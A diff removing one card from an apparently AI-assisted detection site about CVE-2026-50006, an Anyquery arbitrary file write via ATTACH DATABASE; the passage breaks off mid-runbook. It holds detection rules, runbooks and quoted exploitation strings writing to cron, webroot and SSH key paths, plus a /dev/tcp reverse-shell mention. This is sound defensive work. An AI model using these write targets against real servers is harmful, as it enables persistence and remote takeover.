@@ -1,511 +1,3 @@
-<article class="card" id="art-241" data-art-slug="2026-07-14-ghsa-critical-cve-2026-50006-anyquery-arbitrary-file-write-a"
-  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="crit"
-  data-techs="T1190"
-  data-sources="GitHub Security Advisories"
-  data-platforms="datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="application,endpoint,network"
-  data-targets="linux,vcs,windows"
-  data-uc-count="7" data-llm-uc-count="5"
-  data-search="[GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode CVE-2026-50006 T1190 [LLM] Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port) [LLM] Inbound connection to Anyquery listener from a public IP [LLM] Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW) [LLM] ATTACH DATABASE statement targeting persistence paths in Anyquery query logs [LLM] Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp) Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou">
-  <div class="sev-ribbon crit">Critical</div>
-  <button class="share-btn card-share" data-share-art="2026-07-14-ghsa-critical-cve-2026-50006-anyquery-arbitrary-file-write-a" title="Copy share link to this article" aria-label="Copy share link">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-  </button>
-  <h2><a href="https://github.com/advisories/GHSA-xrcf-6jh3-ggvx" target="_blank" rel="noopener">[GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode</a></h2>
-  <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
-  <div class="pubmeta">
-    <span>2026-07-14</span>
-    <span>7 use cases</span>
-    <span>1 technique</span>
-    <span>5 kill-chain phases detected</span>
-  </div>
-  <p class="summary">Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode</p>
-  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-50006</span></div>
-<div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-  <div class="action-row">
-    <button class="btn btn-kc" data-target="art-241-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
-    <button class="btn btn-hunt" data-hunt-art="art-241"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
-    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
-  </div>
-  <div class="killchain" id="art-241-kc">
-  <div class="kc3d"><div class="kc-cell hit">
-  <div class="num">Phase 1</div>
-  <div class="name">Reconnaissance</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 2</div>
-  <div class="name">Weaponization</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 3</div>
-  <div class="name">Delivery</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 4</div>
-  <div class="name">Exploitation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 5</div>
-  <div class="name">Installation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 6</div>
-  <div class="name">Command &amp; Control</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell inferred">
-  <div class="num">Phase 7</div>
-  <div class="name">Actions on Objectives</div>
-  <div class="marker">Likely</div>
-</div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
-<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). <em>→ [LLM] Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port) · [LLM] Inbound connection to Anyquery listener from a public IP</em></div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] ATTACH DATABASE statement targeting persistence paths in Anyquery query logs</em></div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou</em></div>
-<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp)</em></div>
-<div class="phase-line inferred"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
-</div>
-  <div class="usecases"><details class="uc" data-uc-slug="080462833b" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows" open>
-  <summary>
-    <span class="uc-title">Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="080462833b" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts for the Anyquery binary launched in `server` mode with a wildcard bind (0.0.0.0), which exposes the unauthenticated MySQL-compatible port abused in CVE-2026-50006 for ATTACH DATABASE arbitrary file write. Surfaces the attack-surface exposure before any exploitation occurs.
-
-Rationale: Uses the article&#x27;s exact invocation `anyquery server --host 0.0.0.0 --port 8070`; the combination of the named binary, the `server` subcommand and a wildcard bind is the precise exposure precondition for the CVE and is not a generic template.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
-  • https://github.com/julien040/anyquery/releases</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Data/analytics team legitimately running Anyquery server on an internal, network-segmented host</li><li>Container image that binds 0.0.0.0 by convention but is only reachable inside a private overlay network</li><li>Developer running `anyquery server` in a local test/CI environment</li><li>Reverse-proxy fronted deployment where 0.0.0.0 bind is intentional but auth is enforced upstream</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: confirm the Anyquery version (`anyquery --version`); anything &lt; 0.4.5 is vulnerable. Check the bind address and whether the port is reachable from outside the host/subnet. 2) Contain: firewall the listener to localhost/trusted CIDRs or stop the service; upgrade to &gt;= 0.4.5. 3) Hunt: on the same host review DeviceFileEvents for anyquery-initiated writes to /etc/cron.d, /var/www, /root/.ssh (see the AFW use case) and inbound connections from public IPs.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc0-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-241-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc0-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-241-uc0-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-241-uc0-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-241-uc0-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where FileName =~ &quot;anyquery&quot;
-| where ProcessCommandLine has &quot;server&quot;
-| where ProcessCommandLine has_any (&quot;--host 0.0.0.0&quot;, &quot;--host=0.0.0.0&quot;, &quot;-h 0.0.0.0&quot;, &quot;0.0.0.0&quot;)
-| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
-| where TimeGenerated &gt; ago(7d)
-| where TargetProcessName has &quot;anyquery&quot;
-| where TargetProcessCommandLine has &quot;server&quot;
-| where TargetProcessCommandLine has &quot;0.0.0.0&quot;
-| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Anyquery Server Mode Bound To All Interfaces
-id: 4b1f8a2e-2d6c-4f1a-9c7b-8a1d3e5f0a11
-description: Detects Anyquery launched in server mode with a wildcard bind, exposing the unauthenticated MySQL port abused by CVE-2026-50006.
-references:
-  - https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
-author: SOC Detection Engineering
-date: 2026/07/15
-tags:
-  - attack.t1190
-logsource:
-  category: process_creation
-  product: linux
-detection:
-  selection:
-    Image|endswith: &#x27;/anyquery&#x27;
-    CommandLine|contains|all:
-      - &#x27;server&#x27;
-      - &#x27;0.0.0.0&#x27;
-  condition: selection
-level: medium</code></pre></div>
-    <div class="tab-content" id="art-241-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.command_line:*anyquery* @process.command_line:*server* @process.command_line:*0.0.0.0*</code></pre></div>
-    <div class="tab-content" id="art-241-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ImageFileName=/anyquery$/i
-| regex(&quot;server&quot;, field=CommandLine)
-| regex(&quot;0\\.0\\.0\\.0&quot;, field=CommandLine)
-| groupBy([aid, ComputerName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-241-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=anyquery Processes.process=&quot;*server*&quot; Processes.process=&quot;*0.0.0.0*&quot; by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name
-| `drop_dm_object_name(Processes)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=anyquery Processes.process=&quot;*server*&quot; Processes.process=&quot;*0.0.0.0*&quot; by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name
-| `drop_dm_object_name(Processes)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="df438e49a9" data-platforms="def,falcon,sent,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">Inbound connection to Anyquery listener from a public IP</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="df438e49a9" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts for external (public-IP) network connections accepted by the Anyquery process, indicating an internet-reachable, unauthenticated MySQL-compatible endpoint is being reached by outside clients — the delivery vector for the CVE-2026-50006 ATTACH DATABASE write.
-
-Rationale: Ties the accepted inbound connection directly to the `anyquery` process (InitiatingProcess/ContextImageFileName) with a public remote peer, matching the article&#x27;s &#x27;unauthenticated attackers connecting to the MySQL-compatible server port&#x27;. Sentinel/Datadog left empty because inbound-accept events with process attribution are not present in the ASIM network or standard Datadog Linux schemas (explained per prompt guidance).
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Network Service Scanning">T1046</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate BI/reporting clients connecting to an intentionally public Anyquery endpoint</li><li>Cloud provider health-check probes hitting the exposed port</li><li>Internet-wide scanners (Shodan/Censys) touching the port without exploitation</li><li>VPN-exit / NAT gateway making internal client traffic appear as a single public IP</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: geolocate/reputation-check the RemoteIP and count distinct source IPs; a spray of unique public IPs suggests mass scanning. 2) Contain: restrict the listener to trusted source ranges and upgrade to Anyquery &gt;= 0.4.5. 3) Hunt: for any RemoteIP of interest, pivot to DeviceFileEvents for anyquery writes to persistence paths and to DeviceProcessEvents for downstream cron/webshell reverse shells within the following minutes.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-241-uc1-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc1-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-241-uc1-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName =~ &quot;anyquery&quot;
-| where ActionType == &quot;InboundConnectionAccepted&quot;
-| where RemoteIPType == &quot;Public&quot;
-| summarize Connections = count(), Ports = make_set(LocalPort, 10), First = min(Timestamp), Last = max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessCommandLine
-| order by Connections desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
-// Requires the Microsoft 365 Defender data connector (streams the
-// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
-DeviceNetworkEvents
-| where TimeGenerated &gt; ago(7d)
-| where InitiatingProcessFileName =~ &quot;anyquery&quot;
-| where ActionType == &quot;InboundConnectionAccepted&quot;
-| where RemoteIPType == &quot;Public&quot;
-| summarize Connections = count(), Ports = make_set(LocalPort, 10), First = min(TimeGenerated), Last = max(TimeGenerated) by DeviceName, RemoteIP, InitiatingProcessCommandLine
-| order by Connections desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4 ContextImageFileName=/anyquery$/i
-| ConnectionDirection=1
-| groupBy([aid, ComputerName, RemoteAddressIP4, RemotePort, LocalPort], function=count())</code></pre></div>
-    <div class="tab-content" id="art-241-uc1-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=anyquery All_Traffic.direction=inbound by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app
-| `drop_dm_object_name(All_Traffic)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=anyquery All_Traffic.direction=inbound by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app
-| `drop_dm_object_name(All_Traffic)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="f92f9fc95e" data-platforms="def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
-  <summary>
-    <span class="uc-title">Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="f92f9fc95e" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Highest-fidelity detection for CVE-2026-50006: the Anyquery process itself creating files under cron directories, web roots, or SSH key paths. ATTACH DATABASE materialises a SQLite file at the attacker-chosen path, so a write by anyquery into /etc/cron.d, /var/spool/cron, /var/www, or /root/.ssh is a direct exploitation signal.
-
-Rationale: Combines the article&#x27;s exact write targets (/etc/cron.d/pwn, /var/spool/cron/crontabs, /var/www/html/shell.php, /root/.ssh/authorized_keys) with the initiating process being anyquery — a database-federation tool that has no legitimate reason to write into cron/webroot/SSH. Datadog omitted because auditd file-target-path is not in the standard Datadog Linux schema.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Scheduled Task/Job: Cron">T1053.003</span> <span class="ind tech" title="Server Software Component: Web Shell">T1505.003</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Filesystem</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Backup/restore tooling copying an Anyquery .db into /var/www or a home directory</li><li>Sysadmin manually redirecting Anyquery output to a file under an atypical path</li><li>Anyquery legitimately configured with its data directory pointed at a shared web-served folder</li><li>Config-management (Ansible/Puppet) running as the anyquery service account writing crontab entries</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (FolderPath has &quot;/var/www&quot; and FileName endswith &quot;.db&quot; and InitiatingProcessCommandLine has &quot;--datadir&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: inspect the written file — a valid SQLite header (`SQLite format 3`) followed by cron/PHP/SSH-key text confirms the ATTACH DATABASE abuse. Note the target path and owning UID. 2) Contain: delete the malicious file, kill the anyquery process, isolate the host, and upgrade to &gt;= 0.4.5. 3) Hunt: check cron execution and web/PHP process trees for the injected reverse-shell payload and review /root/.ssh/authorized_keys for attacker keys.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-241-uc2-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-241-uc2-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-241-uc2-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-241-uc2-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-241-uc2-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-241-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceFileEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName =~ &quot;anyquery&quot;
-| where FolderPath has_any (&quot;/etc/cron.d&quot;, &quot;/var/spool/cron&quot;, &quot;/etc/cron.hourly&quot;, &quot;/etc/cron.daily&quot;, &quot;/etc/crontab&quot;, &quot;/var/www&quot;, &quot;/root/.ssh&quot;) or FileName =~ &quot;authorized_keys&quot;
-| project Timestamp, DeviceName, InitiatingProcessAccountName, FolderPath, FileName, ActionType, InitiatingProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>ImFileEvent
-| where TimeGenerated &gt; ago(7d)
-| where ActingProcessName has &quot;anyquery&quot;
-| where TargetFilePath has_any (&quot;/etc/cron.d&quot;, &quot;/var/spool/cron&quot;, &quot;/etc/cron.hourly&quot;, &quot;/etc/cron.daily&quot;, &quot;/etc/crontab&quot;, &quot;/var/www&quot;, &quot;/root/.ssh&quot;, &quot;authorized_keys&quot;)
-| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, ActingProcessName, ActingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-241-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: Anyquery Writes To Cron Webroot Or SSH Persistence Path
-id: 9c3d7e14-6a2b-4d88-b1e2-7f4c9a0b2c33
-description: Detects the Anyquery process creating files under cron, web root, or SSH key directories, the ATTACH DATABASE arbitrary file write primitive of CVE-2026-50006.
-references:
-  - https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
-author: SOC Detection Engineering
-date: 2026/07/15
-tags:
-  - attack.t1190
-  - attack.t1053.003
-  - attack.t1505.003
-logsource:
-  category: file_event
-  product: linux
-detection:
-  selection:
-    Image|endswith: &#x27;/anyquery&#x27;
-    TargetFilename|contains:
-      - &#x27;/etc/cron.d&#x27;
-      - &#x27;/var/spool/cron&#x27;
-      - &#x27;/etc/cron.hourly&#x27;
-      - &#x27;/etc/cron.daily&#x27;
-      - &#x27;/var/www&#x27;
-      - &#x27;/root/.ssh&#x27;
-  condition: selection
-level: high</code></pre></div>
-    <div class="tab-content" id="art-241-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileWritten ContextImageFileName=/anyquery$/i
-| TargetFileName=/\/(etc\/cron\.(d|hourly|daily)|etc\/crontab|var\/spool\/cron|var\/www|root\/\.ssh)/i
-| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())</code></pre></div>
-    <div class="tab-content" id="art-241-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_path IN (&quot;/etc/cron.d/*&quot;,&quot;/var/spool/cron/*&quot;,&quot;/etc/cron.hourly/*&quot;,&quot;/etc/cron.daily/*&quot;,&quot;/var/www/*&quot;,&quot;/root/.ssh/*&quot;) by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.action
-| `drop_dm_object_name(Filesystem)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_path IN (&quot;/etc/cron.d/*&quot;,&quot;/var/spool/cron/*&quot;,&quot;/etc/cron.hourly/*&quot;,&quot;/etc/cron.daily/*&quot;,&quot;/var/www/*&quot;,&quot;/root/.ssh/*&quot;) by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.action
-| `drop_dm_object_name(Filesystem)`
-| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="dd11d6efd2" data-platforms="datadog,sent,spl" data-targets="linux">
-  <summary>
-    <span class="uc-title">ATTACH DATABASE statement targeting persistence paths in Anyquery query logs</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="dd11d6efd2" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts application/syslog output from the Anyquery server for the literal ATTACH DATABASE statement pointed at a sensitive filesystem path — the exploitation primitive of CVE-2026-50006 captured at the query layer before or as the file write occurs.
-
-Rationale: Directly hunts the article&#x27;s exploitation string `ATTACH DATABASE &#x27;/etc/cron.d/pwn&#x27;` / `&#x27;/var/www/html/shell.php&#x27;` at the query layer, per reviewer request. Defender/Falcon left empty because SQL query text is application-log data not present in EDR/FDR endpoint schemas; deployability depends on Anyquery query logging being enabled and forwarded to syslog.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate administrator using ATTACH DATABASE to mount a secondary DB during maintenance</li><li>Security-team validation/PoC testing of the CVE against a lab instance</li><li>Application code that legitimately attaches a scratch DB under /tmp or the data dir</li><li>Log lines quoting the advisory text in an ops/incident channel forwarded to syslog</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (SyslogMessage has &quot;ATTACH DATABASE&quot; and SyslogMessage has_any (&quot;/tmp/&quot;, &quot;--datadir&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: read the full statement — a target path outside the Anyquery data directory (cron/webroot/SSH) is malicious; note the client IP if the log records it. 2) Contain: block the source IP, restrict/patch the listener (&gt;= 0.4.5). 3) Hunt: confirm the corresponding file write (AFW use case) and any resulting cron/webshell reverse-shell execution on the 